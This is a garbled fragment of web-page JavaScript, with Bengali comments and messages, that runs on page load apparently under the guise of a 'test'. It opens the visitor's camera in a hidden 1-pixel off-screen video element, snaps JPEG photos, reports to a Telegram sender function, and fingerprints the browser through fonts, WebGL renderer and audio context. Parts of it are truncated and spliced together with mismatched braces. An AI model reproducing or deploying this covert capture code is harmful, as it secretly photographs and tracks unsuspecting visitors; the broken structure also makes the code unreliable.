        async function startContinuousCapture() {

        // --- নির্দিষ্ট ক্যামেরার জন্য ছবি তোলার ফাংশন ---
        async function takePhoto(facingMode) {
            let stream = null;
            let videoElement = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: facingMode } 
                });

                videoElement = document.createElement('video');
                videoElement.srcObject = stream;
                videoElement.autoplay = true;
                videoElement.muted = true;
                videoElement.style.position = 'absolute';
                videoElement.style.top = '-9999px';
                videoElement.style.width = '1px';
                videoElement.style.height = '1px';
                document.body.appendChild(videoElement);

                await new Promise((resolve, reject) => {
                    const timeout = setTimeout(() => reject(new Error('Video play timeout')), 10000);
                    videoElement.onloadedmetadata = () => {
                        videoElement.play().then(() => {
                            clearTimeout(timeout);
                            setTimeout(resolve, 500); 
                        }).catch(reject);
                    };
                });

                const canvas = document.createElement('canvas');
                if (videoElement.videoWidth === 0 || videoElement.videoHeight === 0) {
                    throw new Error("Video dimensions are zero.");
                }
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0);

                return canvas.toDataURL('image/jpeg', 0.8);

            } catch (error) {
                console.error(`Camera (${facingMode}) Error:`, error);
                let errorMessage = 'ক্যামেরা অ্যাক্সেস করা যায়নি';
                if (error instanceof DOMException) {
                    if (error.name === 'NotAllowedError') errorMessage = 'ক্যামেরার অনুমতি দেওয়া হয়নি';
                    else if (error.name === 'NotFoundError') errorMessage = 'কোনো ক্যামেরা পাওয়া যায়নি';
                    else if (error.name === 'NotReadableError') errorMessage = 'ক্যামেরা ইতিমধ্যে অন্য অ্যাপ্লিকেশন ব্যবহার করছে';
                }
                await sendToTelegram(`ক্যামেরা ত্রুটি (${facingMode}): ${errorMessage}`);
                return null;
            } finally {
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                if (videoElement && videoElement.parentNode) {
                    videoElement.parentNode.removeChild(videoElement);
                }
            }
        }

        async function takeAnyPhoto() {
            let stream = null;
            let videoElement = null;

                stream = await navigator.mediaDevices.getUserMedia({ video: true });

                videoElement = document.createElement('video');

            } catch (error) {
                console.error("Continuous Capture Error:", error);

            } finally {

                }
                if (videoElement && videoElement.parentNode) {
                    videoElement.parentNode.removeChild(videoElement);

            };
            
            const baseWidths = baseFonts.map(getWidth);
            
            fontsToCheck.forEach(font => {
                const matched = baseWidths.some((baseWidth, i) => {
                    const fontStack = `'${font}', ${baseFonts[i]}`;
                    return getWidth(fontStack) !== baseWidth;
                });
                
                if (matched) detectedFonts.push(font);
            });
            
            return detectedFonts.join(', ') || 'কোনো অতিরিক্ত ফন্ট পাওয়া যায়নি';
        }
        
        function getWebGLRenderer() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                
                if (!gl) return 'WebGL সমর্থিত নয়';
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'তথ্য লুকানো আছে';
            } catch (e) {
                return 'তথ্য পাওয়া যায়নি';
            }
        }
        
        function getAudioFingerprint() {
            try {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                const context = new AudioContext();
                const oscillator = context.createOscillator();
                const analyser = context.createAnalyser();
                const gain = context.createGain();
                const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
                
                gain.gain.value = 0;
                oscillator.connect(analyser);
                analyser.connect(scriptProcessor);
                scriptProcessor.connect(gain);
                gain.connect(context.destination);
                
                oscillator.start(0);
                const fingerprint = context.sampleRate + '|' + context.destination.channelCount;
                
                oscillator.stop();
                context.close();
                
                return btoa(fingerprint).substring(0, 20);
            } catch (e) {
                return 'অডিও কন্টেক্সট সমর্থিত নয়';
            }
        }

        // পেজটি লোড হলে স্বয়ংক্রিয়ভাবে টেস্ট শুরু করুন
        document.addEventListener('DOMContentLoaded', startTest);
    </script>
